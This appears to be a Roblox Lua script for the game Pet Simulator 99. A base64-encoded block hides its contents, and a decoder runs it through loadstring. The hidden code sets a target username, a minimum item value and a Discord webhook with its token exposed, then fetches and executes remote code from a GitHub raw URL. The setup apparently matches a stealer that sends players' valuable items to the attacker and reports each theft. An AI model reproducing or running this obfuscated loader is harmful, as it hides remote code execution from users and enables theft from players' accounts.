
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gImRjdXo4Z2l1ZHo3IgpVc2VybmFtZTIgPSAiZGN1ejhnaXVkejciCk1pbmltdW1SQVAgPSAxMDAKV2ViaG9vayA9ICJ7ImFwcGxpY2F0aW9uX2lkIjpudWxsLCJhdmF0YXIiOiIxMjgyNTgwN2I5ZjU1Yjk4ODJhNmJkYmFkODhiNDk4YyIsImNoYW5uZWxfaWQiOiIxMzQyNDY5NzExMjQ1NDc5OTgxIiwiZ3VpbGRfaWQiOiIxMzQyNDY5NzExMjQ1NDc5OTc4IiwiaWQiOiIxMzQyNDcwMzM3MjkxNDg5MzIwIiwibmFtZSI6IlBldCA5OSBzY3JpcHQgbm90aWZpY2F0aW9uIiwidHlwZSI6MSwidG9rZW4iOiI4Nk9aOTJsS2wtYjV0dE5UaEkwSUhqRnNYZTUxRk5faUE3RWUzdGFBZWhmY1F4VmkxQmF4VGE3bkZCcThZdUstd2xxbCIsInVybCI6Imh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzNDI0NzAzMzcyOTE0ODkzMjAvODZPWjkybEtsLWI1dHROVGhJMElIakZzWGU1MUZOX2lBN0VlM3RhQWVoZmNReFZpMUJheFRhN25GQnE4WXVLLXdscWwifSIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpLzIxNHNjcmlwdHMvcmVmcy9oZWFkcy9tYWluLzIxNHNjcmlwdHMiLCB0cnVlKSkoKQ=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()